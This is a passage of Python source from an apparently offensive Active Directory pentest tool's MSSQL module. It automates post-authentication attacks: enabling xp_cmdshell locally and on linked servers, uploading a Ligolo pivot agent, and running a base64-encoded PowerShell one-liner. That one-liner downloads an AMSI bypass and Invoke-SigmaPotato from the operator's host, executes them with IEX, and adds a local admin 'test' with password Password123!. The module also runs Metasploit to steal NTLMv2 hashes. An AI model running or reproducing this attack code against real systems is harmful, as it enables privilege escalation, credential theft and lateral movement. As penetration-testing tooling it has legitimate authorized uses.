        probe_payload = _load_mssql_json_stdout(probe_stdout)
        targets_payload = probe_payload.get("targets", []) if isinstance(probe_payload, dict) else []
        if not isinstance(targets_payload, list):
            print_warning("MSSQL pivot probe returned an unexpected payload; skipping report rendering.")
            return

        confirmed_reachable: list[dict[str, Any]] = []
        same_subnet_no_response: list[dict[str, Any]] = []
        no_connectivity_confirmed: list[dict[str, Any]] = []
        for entry in targets_payload:
            if not isinstance(entry, dict):
                continue
            reachable_ports = [
                int(port) for port in entry.get("reachable_ports", []) if str(port).isdigit()
            ]
            reason = str(entry.get("selection_reason") or "").strip()
            if reachable_ports:
                confirmed_reachable.append(entry)
            elif reason.startswith("same_subnet:"):
                same_subnet_no_response.append(entry)
            else:
                no_connectivity_confirmed.append(entry)

        summary_payload: dict[str, Any] = {
            "generated_at": datetime.now(timezone.utc).isoformat(),
            "domain": domain,
            "pivot_host": host,
            "pivot_username": username,
            "interfaces": remote_interfaces,
            "routes": remote_routes,
            "interface_source": interface_source,
            "route_source": route_source,
            "summary": {
                "candidate_count": len(selected_targets),
                "confirmed_reachable_count": len(confirmed_reachable),
                "trusted_domain_target_count": candidate_counts["trusted_domain_count"],
                "same_subnet_no_response_count": len(same_subnet_no_response),
                "no_connectivity_confirmed_count": len(no_connectivity_confirmed),
            },
            "candidate_origins": candidate_counts,
            "targets": targets_payload,
        }
        report_path = _persist_mssql_pivot_reachability_report(
            shell,
            domain=domain,
            host=host,
            payload=summary_payload,
        )

        if confirmed_reachable:
            print_success(
                f"{len(confirmed_reachable)} pivot target(s) appear reachable from {mark_sensitive(host, 'hostname')}."
            )
            if getattr(shell, "console", None):
                table = Table(title="Confirmed Pivot Reachability", box=None)
                table.add_column("IP")
                table.add_column("Hostname(s)")
                table.add_column("Reachable Ports")
                table.add_column("Reason")
                for entry in confirmed_reachable[:10]:
                    table.add_row(
                        mark_sensitive(str(entry.get("ip") or ""), "ip"),
                        ", ".join(
                            mark_sensitive(str(item), "hostname")
                            for item in entry.get("hostname_candidates", [])
                        )
                        or "-",
                        ", ".join(str(port) for port in entry.get("reachable_ports", [])) or "-",
                        mark_sensitive(str(entry.get("selection_reason") or ""), "text"),
                    )
                shell.console.print(table)
        if same_subnet_no_response:
            print_info(
                f"{len(same_subnet_no_response)} target(s) are on-link from the pivot host but still gave no TCP response; they may simply be down/offline."
            )
        if no_connectivity_confirmed:
            print_warning(
                f"{len(no_connectivity_confirmed)} routed target(s) still showed no confirmed TCP reachability from the pivot host."
            )
        if report_path:
            print_info(
                f"Detailed MSSQL pivot reachability report saved to {mark_sensitive(report_path, 'path')}."
            )

        if confirmed_reachable:
            tunnel_created = orchestrate_ligolo_pivot_tunnel(
                shell,
                domain=domain,
                pivot_host=host,
                username=username,
                password=password,
                confirmed_targets=confirmed_reachable,
                detect_remote_architecture=lambda **_kwargs: detect_mssql_windows_architecture(
                    shell=shell,
                    domain=domain,
                    host=host,
                    username=username,
                    password=password,
                    execution_path=execution_path,
                ),
                upload_agent=lambda **kwargs: mssql_upload(
                    shell=shell,
                    domain=kwargs["domain"],
                    host=kwargs["host"],
                    username=kwargs["username"],
                    password=kwargs["password"],
                    execution_path=execution_path,
                    local_path=kwargs["local_path"],
                    remote_path=kwargs["remote_path"],
                ),
                execute_remote_script=lambda **kwargs: _execute_powershell_via_mssql(
                    shell=shell,
                    domain=kwargs["domain"],
                    host=kwargs["host"],
                    username=kwargs["username"],
                    password=kwargs["password"],
                    execution_path=execution_path,
                    script=kwargs["script"],
                    operation_name=kwargs.get("operation_name"),
                ),
                remote_agent_os="windows",
                source_service="mssql",
                pivot_method="ligolo_mssql_pivot",
            )
            if tunnel_created:
                pivot_context = PivotExecutionContext(
                    domain=domain,
                    pivot_host=host,
                    pivot_method="ligolo_mssql_pivot",
                    pivot_tool="Ligolo",
                    source_service="mssql",
                )
                refresh_result = refresh_network_inventory_after_pivot(
                    shell,
                    context=pivot_context,
                )
                if refresh_result.refreshed:
                    render_post_pivot_reachability_delta(
                        shell,
                        context=pivot_context,
                        refresh_result=refresh_result,
                    )
                    if offer_post_pivot_owned_followup:
                        maybe_offer_post_pivot_owned_followup(
                            shell,
                            context=pivot_context,
                            refresh_result=refresh_result,
                        )
    except Exception as exc:  # noqa: BLE001
        telemetry.capture_exception(exc)
        print_warning(
            f"MSSQL pivot reachability check failed on {mark_sensitive(host, 'hostname')}: {str(exc)}"
        )


def run_mssql_postauth_workflow(
    shell: MssqlShell,
    *,
    domain: str,
    host: str,
    username: str,
    password: str,
    workflow_intent: str = "default",
) -> dict[str, object]:
    """Run the premium MSSQL post-auth workflow for low-priv and linked-server paths."""
    if not shell.netexec_path:
        print_error(
            "NetExec (nxc) path not configured. Please ensure it's installed via 'adscan install'."
        )
        return {"completed": False, "error": "netexec_missing"}

    marked_host = mark_sensitive(host, "hostname")
    marked_user = mark_sensitive(username, "user")
    print_operation_header(
        "MSSQL Post-Auth Workflow",
        details={
            "Domain": domain,
            "Host": host,
            "Username": username,
        },
        icon="🗄️",
    )

    ctx = _build_mssql_context(shell)
    runner = MSSQLRunner()
    authenticated, auth_output = runner.verify_authentication(
        host,
        ctx=ctx,
        username=username,
        password=password,
        domain=domain,
        timeout=60,
    )
    if not authenticated:
        print_error(
            f"NetExec did not confirm MSSQL authenticated access for {marked_user} on {marked_host}."
        )
        return {
            "completed": False,
            "error": "auth_not_confirmed",
            "auth_output": auth_output,
        }

    print_success(
        f"Confirmed MSSQL authenticated access for {marked_user} on {marked_host}."
    )

    execution_path: MssqlExecutionPath | None = None
    xp_enabled, _xp_result = runner.enable_xp_cmdshell(
        host,
        ctx=ctx,
        username=username,
        password=password,
        domain=domain,
        timeout=120,
    )
    if xp_enabled:
        print_success(f"xp_cmdshell enabled on {marked_host}.")
        execution_path = MssqlExecutionPath(mode="xp_cmdshell")
    else:
        local_enable_reason = None
        if _xp_result and _xp_result.stdout:
            local_enable_reason = parse_xp_cmdshell_enable_failure_reason(_xp_result.stdout)
        if local_enable_reason:
            print_warning(
                "Local xp_cmdshell enablement failed on "
                f"{marked_host}: {mark_sensitive(local_enable_reason, 'detail')}."
            )
        else:
            print_warning(f"Local xp_cmdshell was not enabled on {marked_host}.")
        print_info(
            "Switching to linked-server enumeration to look for an alternate command-execution path."
        )
        linked_servers, _links_result = runner.enum_linked_servers(
            host,
            ctx=ctx,
            username=username,
            password=password,
            domain=domain,
            timeout=120,
        )
        if linked_servers:
            persisted_path = _persist_mssql_linked_servers(
                shell,
                domain=domain,
                host=host,
                username=username,
                linked_servers=linked_servers,
            )
            print_info(
                f"Persisted linked-server inventory to {mark_sensitive(persisted_path, 'path')}."
            )
            rendered_servers = ", ".join(
                str(mark_sensitive(server, "hostname")) for server in linked_servers
            )
            print_info(f"Discovered linked SQL servers: {rendered_servers}.")
        for linked_server in linked_servers:
            print_info(
                "Attempting linked-server xp_cmdshell enablement on "
                f"{mark_sensitive(linked_server, 'hostname')}."
            )
            linked_enabled, _linked_result = runner.enable_linked_xp_cmdshell(
                host,
                ctx=ctx,
                username=username,
                password=password,
                linked_server=linked_server,
                domain=domain,
                timeout=120,
            )
            if not linked_enabled:
                print_warning(
                    "Linked-server xp_cmdshell enablement was not confirmed on "
                    f"{mark_sensitive(linked_server, 'hostname')}."
                )
                continue
            print_success(
                "xp_cmdshell enabled successfully on linked server "
                f"{mark_sensitive(linked_server, 'hostname')}."
            )
            whoami_result = runner.execute_linked_command(
                host,
                ctx=ctx,
                username=username,
                password=password,
                linked_server=linked_server,
                command="whoami",
                domain=domain,
                timeout=120,
            )
            if not whoami_result or not parse_link_xpcmd_execution_success(whoami_result.stdout):
                print_warning(
                    "Linked-server command validation did not succeed on "
                    f"{mark_sensitive(linked_server, 'hostname')}. Trying the next linked server."
                )
                continue
            identity = parse_link_xpcmd_identity(whoami_result.stdout) or ""
            print_success(
                "Linked-server command execution is available via "
                f"{mark_sensitive(linked_server, 'hostname')}."
            )
            execution_path = MssqlExecutionPath(
                mode="linked_xpcmd",
                linked_server=linked_server,
                identity=identity or None,
            )
            break

    if execution_path is None:
        print_warning(
            "No MSSQL command-execution path was established. Falling back to impersonation checks only."
        )
        run_mssql_check_impersonate(
            shell,
            domain=domain,
            host=host,
            username=username,
            password=password,
        )
        return {
            "completed": True,
            "execution_available": False,
        }

    if execution_path.identity:
        print_info(
            "MSSQL execution identity: "
            f"{mark_sensitive(execution_path.identity, 'user')}"
        )

    if workflow_intent in {"default", "pivot_search", "pivot_relaunch"}:
        check_pivot_reachability_via_mssql(
            shell,
            domain=domain,
            host=host,
            username=username,
            password=password,
            execution_path=execution_path,
            offer_post_pivot_owned_followup=(workflow_intent != "pivot_relaunch"),
        )
    print_info(
        "Proceeding with MSSQL filesystem follow-ups after pivot checks."
    )
    mapping_result = _run_mssql_filesystem_mapping(
        shell,
        domain=domain,
        host=host,
        username=username,
        password=password,
        execution_path=execution_path,
    )
    run_mssql_check_impersonate(
        shell,
        domain=domain,
        host=host,
        username=username,
        password=password,
    )
    return {
        "completed": True,
        "execution_available": True,
        "execution_mode": execution_path.mode,
        "linked_server": execution_path.linked_server,
        "filesystem_mapping": mapping_result,
    }


def run_mssql_check_impersonate(
    shell: MssqlShell, *, domain: str, host: str, username: str, password: str
) -> bool:
    """Check SeImpersonatePrivilege via MSSQL and trigger follow-up prompt."""
    if not shell.netexec_path:
        print_error(
            "NetExec (nxc) path not configured. Please ensure it's installed via 'adscan install'."
        )
        return False

    marked_host = mark_sensitive(host, "hostname")
    marked_username = mark_sensitive(username, "user")
    print_operation_header(
        "MSSQL SeImpersonate Check",
        details={
            "Domain": domain,
            "Host": host,
            "Username": username,
            "Command": "whoami /priv",
        },
        icon="🧩",
    )
    print_info(f"Checking SeImpersonate privileges on host {marked_host}")

    service = ExploitationService()
    ctx = _build_mssql_context(shell)
    result = service.mssql.check_seimpersonate(
        host=host,
        username=username,
        password=password,
        domain=domain,
        ctx=ctx,
        timeout=60,
    )

    try:
        properties = {"has_privilege": bool(result.has_privilege)}
        properties.update(build_lab_event_fields(shell=shell, include_slug=True))
        telemetry.capture("mssql_seimpersonate_checked", properties)
    except Exception as e:  # pragma: no cover
        telemetry.capture_exception(e)

    if result.has_privilege:
        print_success(
            f"User {marked_username} with SeImpersonatePrivilege detected on host {marked_host}"
        )
        shell.ask_for_mssql_impersonate(domain, host, username, password)
        return True

    print_warning("SeImpersonatePrivilege not detected.")
    return False


def run_mssql_impersonate(
    shell: MssqlShell, *, domain: str, host: str, username: str, password: str
) -> None:
    """Exploit SeImpersonate via MSSQL using the legacy SigmaPotato payload flow.

    This preserves the current behavior:
    - copies helper payload files into the current directory
    - base64-encodes a PowerShell one-liner using ps-encoder.py
    - executes it via NetExec MSSQL xp_cmdshell
    """
    if not shell.myip:
        print_error(
            "MyIP is not configured; required to host payload files for MSSQL impersonate."
        )
        return

    tools_install_dir = os.environ.get("ADSCAN_TOOLS_INSTALL_DIR")
    if not tools_install_dir:
        tools_install_dir = str(get_adscan_home() / "tools")

    add_admin_bat = os.path.join(
        tools_install_dir, "windows-tools", "add_local_admin_user.bat"
    )
    invoke_sigma = os.path.join(tools_install_dir, "Tools", "Invoke-SigmaPotato.ps1")
    amsi_txt = os.path.join(tools_install_dir, "Tools", "amsi.txt")

    copy_command = f"cp {add_admin_bat} command.bat && cp {invoke_sigma} test.ps1 && cp {amsi_txt} test.txt"
    print_info_debug(f"[mssql] Staging payload files: {copy_command}")
    stage = shell.run_command(copy_command, timeout=60)
    if not stage or stage.returncode != 0:
        print_error(
            "Failed to stage MSSQL payload files (command.bat/test.ps1/test.txt)."
        )
        return

    encoded_command = (
        "ps-encoder.py -e "
        f'\'$wr = [System.NET.WebRequest]::Create("http://{shell.myip}/test.txt");'
        "$r = $wr.GetResponse();"
        "IEX ([System.IO.StreamReader]($r.GetResponseStream())).ReadToEnd();"
        f'$wr = [System.NET.WebRequest]::Create("http://{shell.myip}/test.ps1");'
        "$r = $wr.GetResponse();"
        "IEX ([System.IO.StreamReader]($r.GetResponseStream())).ReadToEnd();"
        f"iwr http://{shell.myip}/command.bat -OutFile C:\\\\Users\\\\Public\\\\Music\\\\command.bat;"
        "Invoke-SigmaPotato -Command C:\\\\Users\\\\Public\\\\Music\\\\command.bat;"
        "rm C:\\\\Users\\\\Public\\\\Music\\\\command.bat'"
    )
    print_info_debug("[mssql] Encoding PowerShell payload via ps-encoder.py")
    encoded_proc = shell.run_command(encoded_command, timeout=120)
    if (
        not encoded_proc
        or encoded_proc.returncode != 0
        or not (encoded_proc.stdout or "").strip()
    ):
        print_error("Failed to encode PowerShell payload (ps-encoder.py).")
        if encoded_proc and encoded_proc.stderr:
            print_info_debug(encoded_proc.stderr)
        return
    encoded_output = (encoded_proc.stdout or "").strip()

    marked_host = mark_sensitive(host, "hostname")
    print_info(f"Adding test user to host {marked_host} via MSSQL")

    service = ExploitationService()
    ctx = _build_mssql_context(shell)
    result = service.mssql.execute_encoded_powershell(
        host=host,
        username=username,
        password=password,
        encoded_command=encoded_output,
        domain=domain,
        ctx=ctx,
        timeout=300,
    )
    if not result or not getattr(result, "success", False):
        print_error("MSSQL impersonate payload execution failed.")
        return

    stdout = getattr(result, "stdout", "") or ""
    if "successfully" in stdout.lower():
        print_success(
            f"Test user with password Password123! added as local admin on host {marked_host}"
        )
        shell.ask_for_dump_host(domain, host, "test", "Password123!", "True")
        return

    print_warning(
        "MSSQL impersonate command executed but success marker not found in output."
    )


def ask_for_mssql_access(
    shell: MssqlShell,
    *,
    domain: str,
    host: str,
    username: str,
    password: str,
    workflow_intent: str = "default",
) -> None:
    """Ask user if they want to run the MSSQL post-auth workflow."""
    if (
        ensure_host_bound_workflow_target_viable(
            shell,
            domain=domain,
            target_host=host,
            workflow_label="MSSQL access workflow",
            resume_after_pivot=True,
        )
        is None
    ):
        return
    marked_host = mark_sensitive(host, "hostname")
    marked_user = mark_sensitive(username, "user")
    if Confirm.ask(
        "Do you want to run the MSSQL post-auth workflow on "
        f"{marked_host} with {marked_user}?",
        default=False,
    ):
        run_mssql_postauth_workflow(
            shell,
            domain=domain,
            host=host,
            username=username,
            password=password,
            workflow_intent=workflow_intent,
        )


def ask_for_mssql_impersonate(
    shell: MssqlShell, *, domain: str, host: str, username: str, password: str
) -> None:
    """Ask user if they want to exploit SeImpersonate on the target host."""
    marked_host = mark_sensitive(host, "hostname")
    if Confirm.ask(
        f"Do you want to exploit SeImpersonate on {marked_host} (a new local admin user 'test' with password Password123! will be added)?",
        default=False,
    ):
        shell.mssql_impersonate(domain, host, username, password)


def ask_for_mssql_steal(
    shell: MssqlShell,
    *,
    domain: str,
    host: str,
    username: str,
    password: str,
    islocal: str,
) -> None:
    """Ask user if they want to attempt to steal NTLMv2 hash via MSSQL."""
    marked_username = mark_sensitive(username, "user")
    if Confirm.ask(
        f"Do you want to attempt to steal the NTLMv2 hash of the domain user associated with {marked_username} from the database?",
        default=False,
    ):
        shell.mssql_steal_ntlmv2(domain, host, username, password, islocal)


def run_mssql_steal_ntlmv2(
    shell: MssqlShell,
    *,
    domain: str,
    host: str,
    username: str,
    password: str,
    islocal: str,
) -> None:
    """Steal NTLMv2 hash via MSSQL using Metasploit."""
    marked_username = mark_sensitive(username, "user")
    marked_password = mark_sensitive(password, "password")
    marked_host = mark_sensitive(host, "hostname")
    command = (
        f"msfconsole -x 'use auxiliary/admin/mssql/mssql_ntlm_stealer;"
        f"set username {marked_username};"
        f"set password {marked_password};"
        f"set RHOSTS {marked_host};"
        f"set USE_WINDOWS_AUTHENT {islocal};"
        f"set smbproxy {shell.myip};"
        f"run;exit'"
    )
    print_info("Stealing the NTLMv2 hash of the user")
    execute_mssql_steal_ntlmv2(shell, command)


def do_mssql_steal_ntlmv2(shell: MssqlShell, args: str) -> None:
    """CLI handler for mssql_steal_ntlmv2 command.

    Steals the NTLMv2 hash of the specified user in the given domain and host,
    using the SeImpersonate vulnerability in MSSQL.

    Args:
        shell: The shell instance
        args: Space-separated string containing:
            - domain (str) - The domain name.
            - host (str) - The name or IP address of the host.
            - username (str) - The username to authenticate with MSSQL.
            - password (str) - The password for the specified username.
            - islocal (str) - If "true", the script will attempt to use local
              Windows Authentication credentials to access MSSQL. If "false",
              the script will prompt the user for credentials.

    The function prepares and executes a series of commands to steal the NTLMv2
    hash of the specified user on the target host using the SeImpersonate
    privilege. Upon successful execution, the NTLMv2 hash is printed to the console.
    """
    args_list = args.split()
    if len(args_list) != 5:
        print_warning(
            "Usage: mssql_steal_NTLMv2 <domain> <host> <username> <password> <islocal>"
        )
        return
    domain = args_list[0]
    host = args_list[1]
    username = args_list[2]
    password = args_list[3]
    islocal = args_list[4]
    shell.mssql_steal_ntlmv2(domain, host, username, password, islocal)


def do_mssql_impersonate(shell: MssqlShell, args: str) -> None:
    """CLI handler for mssql_impersonate command.

    Adds a local admin user to the target host using MSSQL.

    Args:
        shell: The shell instance
        args: Space-separated string containing:
            - domain (str) - The domain name.
            - host (str) - The name or IP address of the host.
            - username (str) - The username to authenticate with MSSQL.
            - password (str) - The password for the specified username.

    The function constructs a command to add a local admin user to the target
    host using MSSQL and starts a thread to execute this command.
    """
    args_list = args.split()
    if len(args_list) != 4:
        print_warning(
            "Usage: mssql_impersonate <domain> <host> <username> <password>"
        )
        return
    domain = args_list[0]
    host = args_list[1]
    username = args_list[2]
    password = args_list[3]
    shell.mssql_impersonate(domain, host, username, password)


def execute_mssql_steal_ntlmv2(shell: MssqlShell, command: str) -> None:
    """Execute Metasploit command to steal NTLMv2 hash via MSSQL."""
    try:
        completed_process = shell.run_command(command, timeout=300)

        if completed_process and completed_process.stdout:
            for line_content in completed_process.stdout.splitlines():
                output_str = line_content.strip()
                print_info(output_str)
                if "completed" in output_str:
                    print_success("Exploit executed successfully")
                    break

        if completed_process and completed_process.returncode == 0:
            print_success("Process completed successfully.")
        else:
            print_error("Exploit failed or process terminated with errors.")
            if completed_process and completed_process.stderr:
                print_error(f"Details: {completed_process.stderr.strip()}")
            elif (
                completed_process
                and completed_process.stdout
                and "completed" not in completed_process.stdout
            ):
                print_error(f"Details: {completed_process.stdout.strip()}")
    except Exception as e:
        telemetry.capture_exception(e)
        print_error("Error executing Metasploit.")
        print_exception(show_locals=False, exception=e)


def execute_mssql_check_impersonate(
    shell: MssqlShell,
    *,
    command: str,
    domain: str,
    host: str,
    username: str,
    password: str,
) -> None:
    """Execute command to check for SeImpersonatePrivilege via MSSQL."""
    try:
        completed_process = shell.run_command(command, timeout=300)
        if completed_process and completed_process.returncode == 0:
            output_str = strip_ansi_codes(completed_process.stdout or "")
            if "SeImpersonatePrivilege" in output_str:
                marked_username = mark_sensitive(username, "user")
                marked_host = mark_sensitive(host, "hostname")
                print_success(
                    f"User {marked_username} with SeImpersonatePrivilege detected on host {marked_host}"
                )
                ask_for_mssql_impersonate(
                    shell, domain=domain, host=host, username=username, password=password
                )
            else:
                print_error("Exploit failed to find SeImpersonatePrivilege.")
                if completed_process.stderr:
                    print_error(f"Details: {completed_process.stderr.strip()}")
        else:
            error_message = (
                strip_ansi_codes(completed_process.stderr or "").strip()
                if completed_process and completed_process.stderr
                else strip_ansi_codes(completed_process.stdout or "").strip()
                if completed_process and completed_process.stdout
                else ""
            )
            print_error(
                f"Command execution failed: {error_message if error_message else 'No error details'}"
            )
    except Exception as e:
        telemetry.capture_exception(e)
        print_error("Error executing zerologon-exploit.py.")
        print_exception(show_locals=False, exception=e)


def execute_mssql_impersonate(
    shell: MssqlShell, *, command: str, domain: str, host: str
) -> None:
    """Execute command to exploit SeImpersonate via MSSQL."""
    try:
        completed_process = shell.run_command(command, timeout=300)
        if completed_process and completed_process.returncode == 0:
            output_str = strip_ansi_codes(completed_process.stdout or "")
            if "successfully" in output_str:
                marked_host = mark_sensitive(host, "hostname")
                print_success(
                    f"Test user with password Password123! added as local admin on host {marked_host}"
                )
                shell.ask_for_dump_host(domain, host, "test", "Password123!", "True")
            else:
                print_error(
                    'Exploit command ran but "successfully" message not found in output.'
                )
                if output_str:
                    print_info(f"Output: {output_str.strip()}")
                if completed_process.stderr:
                    print_error(f"Stderr: {completed_process.stderr.strip()}")
        else:
            print_error("Error executing MSSQL impersonate exploit.")
            error_message = (
                completed_process.stderr.strip()
                if completed_process and completed_process.stderr
                else completed_process.stdout.strip()
                if completed_process and completed_process.stdout
                else ""
            )
            if error_message:
                print_error(f"Details: {error_message}")
    except Exception as e:
        telemetry.capture_exception(e)
        print_error("Error executing netexec.")
        print_exception(show_locals=False, exception=e)
